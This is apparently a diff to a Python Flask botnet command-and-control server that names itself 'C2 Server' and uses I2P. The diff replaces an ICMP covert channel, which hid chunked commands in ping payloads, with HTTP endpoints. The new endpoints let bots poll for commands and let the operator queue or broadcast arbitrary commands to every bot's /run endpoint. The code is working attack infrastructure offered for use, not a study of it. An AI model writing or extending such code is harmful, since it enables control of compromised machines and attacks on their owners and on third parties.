@@ -5,9 +5,6 @@ import time
 import random
 import requests
 import json
-import hashlib
-import struct
-import subprocess
 
 app = Flask(__name__)
 SHARED_DIR = "shared_bots"
@@ -91,46 +88,11 @@ def sync_shared_bots():
             print(f"[!] Could not update bots.txt: {e}")
         time.sleep(60)
 
-# === ICMP Command Protocol ===
-
-def send_icmp_packet(ip, icmp_payload):
-    try:
-        # Uses ping with -p to inject raw hex payload (requires root)
-        hex_payload = icmp_payload.hex()
-        subprocess.run(["ping", "-c", "1", "-p", hex_payload, ip],
-                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    except Exception as e:
-        print(f"[!] Error sending ICMP to {ip}: {e}")
-
-def make_icmp_payload(payload_type, chunk_num, payload):
-    sig = b"FILEXFER"         # 8 bytes
-    typ = struct.pack("B", payload_type)
-    chunk = struct.pack(">H", chunk_num)
-    h = hashlib.sha256(payload).digest()  # 32 bytes hash
-    return sig + typ + chunk + h + payload
-
-def send_command_icmp(ip, full_command):
-    # Split into 100 byte chunks
-    CHUNK_SIZE = 100
-    chunks = [full_command[i:i+CHUNK_SIZE].encode() for i in range(0, len(full_command), CHUNK_SIZE)]
-
-    # START
-    send_icmp_packet(ip, make_icmp_payload(0, 0, b"command.txt"))
-    time.sleep(0.3)
-
-    # CHUNKS
-    for i, chunk in enumerate(chunks):
-        send_icmp_packet(ip, make_icmp_payload(1, i, chunk))
-        time.sleep(0.3)
-
-    # END
-    send_icmp_packet(ip, make_icmp_payload(2, len(chunks), hashlib.sha256(full_command.encode()).digest()))
-
 # === Flask Endpoints ===
 
 @app.route("/")
 def index():
-    return "C2 Server with I2P + ICMP is running."
+    return "C2 Server is running."
 
 @app.route("/check")
 def check():
@@ -150,13 +112,17 @@ def heartbeat():
     alive = []
     for bot in bots:
         try:
-            result = subprocess.run(["ping", "-c", "1", "-W", "1", bot],
-                                    stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
-            if "1 received" in result.stdout.decode():
+            r = requests.get(f"http://{bot}/ping", timeout=2)
+            if r.status_code == 200 and "pong" in r.text.lower():
                 alive.append(bot)
         except:
-            pass
+            continue
     return jsonify({"alive": alive, "count": len(alive)})
+
+@app.route("/getcmd/<botid>")
+def get_cmd(botid):
+    cmds = safe_load_json(COMMAND_FILE)
+    return cmds.get(botid, "")
 
 @app.route("/sendcmd", methods=["POST"])
 def send_cmd():
@@ -166,13 +132,10 @@ def send_cmd():
     if not botid or not cmd:
         return jsonify({"error": "Missing botid or cmd"}), 400
 
-    print(f"[>] Sending command to {botid} via ICMP...")
-    send_command_icmp(botid, cmd)
-
     cmds = safe_load_json(COMMAND_FILE)
     cmds[botid] = cmd
     safe_save_json(COMMAND_FILE, cmds)
-    return jsonify({"status": "ICMP command sent to bot."})
+    return jsonify({"status": "Command set for bot."})
 
 @app.route("/runall", methods=["POST"])
 def runall():
@@ -181,15 +144,30 @@ def runall():
     if not cmd:
         return jsonify({"error": "Missing cmd"}), 400
 
-    print(f"[>] Broadcasting command via ICMP to all known bots...")
+    cmds = safe_load_json(COMMAND_FILE)
+    for bot in load_all_bots():
+        cmds[bot] = cmd
+    safe_save_json(COMMAND_FILE, cmds)
+    return jsonify({"status": f"Command set for {len(cmds)} bots."})
+
+@app.route("/broadcast", methods=["POST"])
+def broadcast_cmd():
+    cmd = request.json.get("cmd")
+    if not cmd:
+        return jsonify({"error": "Missing cmd"}), 400
+
     bots = load_all_bots()
+    success = 0
     for bot in bots:
-        send_command_icmp(bot, cmd)
-        time.sleep(0.1)
+        try:
+            r = requests.post(f"http://{bot}/run", json={"cmd": cmd}, timeout=3)
+            if r.status_code == 200:
+                success += 1
+        except:
+            pass
+    return jsonify({"sent": success, "total": len(bots)})
 
-    return jsonify({"status": f"Command sent via ICMP to {len(bots)} bots."})
-
-# === Server Boot ===
+# === Run server ===
 
 def run():
     print("[*] Checking I2P connection...")
